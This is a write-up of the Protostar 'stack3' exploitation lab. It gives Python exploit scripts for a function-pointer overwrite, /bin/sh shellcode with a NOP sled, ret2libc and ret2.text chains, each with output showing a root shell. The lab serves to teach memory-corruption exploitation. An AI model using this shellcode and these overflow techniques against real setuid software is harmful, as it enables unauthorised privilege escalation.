# stack3

## solution
Quick disassembly to see the offsets of the variables stored in the binary.
```
[0x08048370]> pdf @main
            ; DATA XREF from entry0 @ 0x8048387
┌ 65: int main (int argc, char **argv, char **envp);
│           ; var uint32_t var_60h @ esp+0x4
│           ; var char *s @ esp+0x1c
│           ; var uint32_t var_8h @ esp+0x5c
```

```
>>> 0x5c - 0x1c
64
```

```
user@protostar:/opt/protostar/bin$ python -c 'print "A"*64+"\x24\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## shells

### classic buffer overflow
Since the program will always call the address stored in `var_8h` we can't overwrite %eip like we
usually would. So in this case we're going to use `var_8h` in the same way we would %eip, and use
it to redirect process execution.

Since we already know the offset to `var_8h` we don't need to calculate it's offset.

```py
import struct

off = 64

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0xbffff7a8 + 0x80)

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ ./stack3 < /tmp/pwn
calling function pointer, jumping to 0xbffff828
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2libc
Read stack0 to see how we calculated the appropriate offsets for `libc`, `system` and `/bin/sh`
required for this ret2libc exploit.

This one is a little different, as I couldn't seem to be able to call `libc` directly. So instead
I modified `var_8h` redirect back to the `ret` instruction, and execute as normal after the call.

```py
import struct

off1 = 64
pad1 = 'A' * off1

call = struct.pack('I', 0x08048478)

off2 = 12
pad2 = 'A' * off2

bin_sh = struct.pack('I', 0xb7fb63bf)
system = struct.pack('I', 0xb7ecffb0)

print pad1 + call + pad2 + system + 'AAAA' + bin_sh
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack3
calling function pointer, jumping to 0x08048478
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2.text to shellcode 
```
➜  stack git:(master) ✗ msfelfscan -s -f stack3
0x080484e7   edi ebp ret
0x080483f2   ebx ebp ret
0x08048517   ebx ebp ret
```

```py
import struct

off = 64

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0x08048478)
ret += 'A' * 12

ret += struct.pack('I', 0x080484e7)

ret += 'AAAA'                              # POP
ret += 'AAAA'                              # POP
ret += struct.pack('I', 0xbffff7c4 + 0x80) # RET

print pad + ret + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./stack3
calling function pointer, jumping to 0x08048478
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

### ret2.text to libc
```py
import struct

system = struct.pack('I', 0xb7ecffb0)
bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)

off = 64

pad = 'A' * off

buf = ''
buf += '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

ret = struct.pack('I', 0x08048478)
ret += 'A' * 12

ret += struct.pack('I', 0x080484e7)

ret += 'AAAA' # POP
ret += 'AAAA' # POP
ret += system # RET

print pad + ret + 'AAAA' + bin_sh
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack3
calling function pointer, jumping to 0x08048478
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

